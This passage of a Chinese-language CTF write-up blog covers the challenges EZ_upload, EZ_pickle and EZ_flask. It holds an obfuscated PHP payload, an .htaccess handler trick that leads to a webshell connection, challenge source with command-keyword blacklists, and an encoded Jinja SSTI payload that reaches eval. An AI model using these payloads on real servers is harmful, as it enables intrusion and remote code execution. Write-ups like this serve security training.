class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>.<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>.<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>.<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))))()))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/24/gkUB4tPzeCioVv7.png" alt="image-20201224192839797"></p><p><img src="https://i.loli.net/2020/12/24/SsHDxGWBlfgIVuL.png" alt="image-20201224193041277"></p><h3 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h3><p>扫描目录</p><p><img src="https://i.loli.net/2020/12/24/XJYx8NE9c2OyiGw.png" alt="image-20201224201258096"></p><p>访问可访问的目录</p><p><img src="https://i.loli.net/2020/12/24/4weYqknSfE2m5Bz.png" alt="image-20201224201355301"></p><p>hinit_1</p><p><img src="https://i.loli.net/2020/12/25/S3kCDtJu2KMqgIQ.png" alt="image-20201225143656131"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//hint_2  源码</span><br><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Missing something&quot;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br>$content = $_POST[<span class="hljs-string">&#x27;content&#x27;</span>];<br>$filename = $_POST[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!is_string($content) || strlen($content) &gt; <span class="hljs-number">125</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;content is too long!!!&quot;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (!is_string($filename) || strlen($filename) &gt; <span class="hljs-number">10</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;filename is too long!!!&quot;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">31</span>; $i++) &#123;<br>    <span class="hljs-keyword">if</span> ($i !== <span class="hljs-number">10</span> &amp;&amp; stristr($content, chr($i))) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;only visible character &quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">127</span>; $i &lt; <span class="hljs-number">256</span>; $i++) &#123;<br>    <span class="hljs-keyword">if</span> (stristr($content, chr($i))) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;only visible character &quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br>$content_blacklist = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;session&quot;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;upload&quot;</span>, <span class="hljs-string">&quot;append&quot;</span>, <span class="hljs-string">&quot;prepend&quot;</span>, <span class="hljs-string">&quot;log&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;include&quot;</span>, <span class="hljs-string">&quot;zend&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;pcre&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;\\\\&quot;</span>,<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span> );<br><span class="hljs-keyword">foreach</span> ($content_blacklist <span class="hljs-keyword">as</span> $keywords) &#123;<br>    <span class="hljs-keyword">if</span> (stristr($content, $keywords)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br>$filename_blacklist = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ph&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>,<span class="hljs-string">&#x27;pl&#x27;</span>,<span class="hljs-string">&#x27;perl&#x27;</span>,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-string">&quot;py&quot;</span>);<br>$append_string = <span class="hljs-string">&quot;ohohohohohohohohoh!&quot;</span>;<br>$yourdir = md5($_COOKIE[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>]);<br><span class="hljs-keyword">foreach</span> ($filename_blacklist <span class="hljs-keyword">as</span> $file_keys) &#123;<br>    <span class="hljs-keyword">if</span> (stristr($filename, $file_keys)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!is_dir($yourdir)) &#123;<br>    @mkdir($yourdir);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    file_put_contents($yourdir . <span class="hljs-string">&#x27;/&#x27;</span> . $filename, $content . $append_string);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file&#x27;s path:  /var/www/html/&quot;</span>.$yourdir . <span class="hljs-string">&#x27;/&#x27;</span> . $filename;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br> <span class="hljs-comment">// 过滤了AddType  setHandler  </span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload:<br>上传 .htaccess<br>AddHandler application/x-httpd-php .aa .<span class="hljs-string">&quot;&quot;</span> <span class="hljs-number">123</span><br><span class="hljs-regexp">//</span>AddHandler 居然还能这么用……  涨知识<br><br><br><span class="hljs-regexp">//</span> <span class="hljs-string">&quot;&quot;</span> 可以起到注释作用<br>然后使用短标签，传入后缀为.aa的文件，并且使用注释 <span class="hljs-regexp">//</span> <br></code></pre></td></tr></table></figure><p>菜刀连接</p><p><img src="https://i.loli.net/2020/12/30/Hce1lVCbvQZTKfo.png" alt="image-20201230205613400"></p><h3 id="EZ-pickle"><a href="#EZ-pickle" class="headerlink" title="EZ_pickle"></a>EZ_pickle</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, escape, request <br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io <br><span class="hljs-keyword">import</span> module_flag <br>beifen=module_flag.sys.modules <br>app = Flask(__name__) <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RestrictedUnpickler</span>(<span class="hljs-params">pickle.Unpickler</span>):</span> <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span> <br>        blackList =[<span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;pickle&quot;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;Flask&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>,<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;attr&#x27;</span>,<span class="hljs-string">&#x27;dict&#x27;</span>,<span class="hljs-string">&#x27;modules&#x27;</span>] <br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> blackList:<br>            <span class="hljs-keyword">if</span> b <span class="hljs-keyword">in</span> module <span class="hljs-keyword">or</span> b <span class="hljs-keyword">in</span> name: <br>                <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name)) <br>                <span class="hljs-keyword">if</span> module == <span class="hljs-string">&#x27;module_flag&#x27;</span> <span class="hljs-keyword">and</span> (name[:<span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;_&#x27;</span>): <br>                    <span class="hljs-keyword">return</span> getattr(module_flag.sys.modules[<span class="hljs-string">&#x27;module_flag&#x27;</span>], name) <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name)) <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restricted_loads</span>(<span class="hljs-params">s</span>):</span> <br>        res = RestrictedUnpickler(io.BytesIO(s)).load() <br>        print(module_flag.sys.modules) <br>        module_flag.sys.modules = beifen <br>        print(module_flag.sys.modules) <br>        <span class="hljs-keyword">return</span> str(res) <br><span class="hljs-meta">@app.route(&#x27;/&#x27;) </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span> <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;view source /src&#x27;</span> <br><span class="hljs-meta">@app.route(&#x27;/src&#x27;) </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">src</span>():</span> <br>        file = open(<span class="hljs-string">&quot;/src/app.py&quot;</span>).read() <br>        <span class="hljs-keyword">return</span> file <br><span class="hljs-meta">@app.route(&#x27;/pickle&#x27;) </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">NoVulnPickle</span>():</span> <br>        <span class="hljs-keyword">try</span>: <br>            //代码偶尔能访问，逻辑错误，只过滤了system<br>            p = request.args.get(<span class="hljs-string">&quot;pickle&quot;</span>) <br>            blackList = [<span class="hljs-string">&quot;system&quot;</span> ,<span class="hljs-string">&quot;os&quot;</span> ,<span class="hljs-string">&quot;popen&quot;</span> , <span class="hljs-string">&quot;pickle&quot;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;Flask&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>,<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;attr&#x27;</span>,<span class="hljs-string">&#x27;dict&#x27;</span>,<span class="hljs-string">&#x27;modules&#x27;</span>,<span class="hljs-string">&#x27;global&#x27;</span>] <br>         <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> blackList: <br>            <span class="hljs-keyword">if</span> b <span class="hljs-keyword">in</span> p: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hacker!&quot;</span> <br>            <span class="hljs-keyword">else</span>: <br>                p = p.encode() <br>                <span class="hljs-comment"># print(p) </span><br>          <span class="hljs-keyword">return</span> restricted_loads(p) <br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e: <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;failed&#x27;</span> <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;OK&quot;</span> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>: <br>app.run(debug=<span class="hljs-literal">False</span>,host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-string">&#x27;5000&#x27;</span>)<br></code></pre></td></tr></table></figure><blockquote><p>看完代码，一脸懵逼，这题不会，寒假学习:anger: （寒假没了）</p></blockquote><h3 id="EZ-flask"><a href="#EZ-flask" class="headerlink" title="EZ_flask"></a>EZ_flask</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//爆破md5</span><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i in <span class="hljs-keyword">range</span>(<span class="hljs-number">100000000</span>):<br>    i=str(i)<br>    h=hashlib.md5()<br>    h.update(i.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    a = h.hexdigest()<br>    <span class="hljs-keyword">if</span>( a[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>] == <span class="hljs-string">&quot;52491&quot;</span> ):<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>     <span class="hljs-comment">// 具体md5值按实际情况更改</span><br></code></pre></td></tr></table></figure><p>测试发现题目中 <code>&#123;</code> 和 <code>&#125;</code>  不能同时在一起 ，用户名和后面的参数我们可控，所以分开构造<code>&#123;&#125;</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">// uasename=&#123;&#123;&quot; </span><br>session:eyJoYXNoMSI6ImU0ODZhIiwicGFzc3dvcmQiOiIxODkxMzEwIiwic3RhdHVzIjoxLCJ1c2VybmFtZSI6Int7XCIifQ.X-YGjg<span class="hljs-number">.2</span>-hzaxNZJk0O<span class="hljs-number">-889</span>uMo3wnxMBkE<br></code></pre></td></tr></table></figure><p>这里先直接贴出payload；考试后去学习</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">http://<span class="hljs-number">219.219</span>.<span class="hljs-number">61.234</span>:<span class="hljs-number">50007</span>/<span class="hljs-string">&quot;|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,99,108,97,115,115,95,95))|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,98,97,115,101,95,95))|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,103,101,116,105,116,101,109,95,95))(164)|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,105,110,105,116,95,95))|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,103,108,111,98,97,108,115,95,95))|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,103,101,116,105,116,101,109,95,95))(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,98,117,105,108,116,105,110,115,95,95))|attr(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(95,95,103,101,116,105,116,101,109,95,95))(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-string">&quot;%(101,118,97,108))(&quot;</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span class="hljs-symbol">%c</span><span 